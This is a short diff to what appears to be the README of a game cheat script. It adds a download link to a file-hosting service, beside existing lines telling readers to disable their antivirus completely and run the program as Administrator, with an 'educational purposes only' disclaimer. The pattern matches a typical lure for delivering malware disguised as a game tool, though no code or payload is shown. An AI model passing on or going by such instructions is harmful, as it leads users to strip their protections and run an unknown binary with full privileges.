@@ -26,4 +26,5 @@ Make sure your antivirus is completely disabled before running, as it might fals
 Running as Administrator is recommended for full functionality.
 
 The script is for educational and testing purposes only. Do not use it to violate game terms of service.
+Download Link: https://mega.nz/file/O0x1gRgR#46EuD2XVtE36tqd52m7Lil4M7gG3IrDBCLRwFuVp4_k
 
